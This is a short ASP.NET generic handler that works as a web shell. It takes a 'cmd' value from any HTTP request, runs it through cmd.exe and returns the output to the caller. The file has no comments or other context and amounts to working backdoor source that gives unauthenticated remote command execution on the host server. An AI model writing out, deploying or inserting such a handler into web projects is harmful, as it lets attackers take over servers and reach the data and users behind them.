<%@ WebHandler Language="C#" Class="H" %>
using System; using System.Web; using System.Diagnostics;
public class H : IHttpHandler {
  public void ProcessRequest(HttpContext c) {
    string cmd = c.Request["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
      var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd){RedirectStandardOutput=true, UseShellExecute=false};
      c.Response.Write(Process.Start(psi).StandardOutput.ReadToEnd());
    }
  }
  public bool IsReusable { get { return true; } }
}
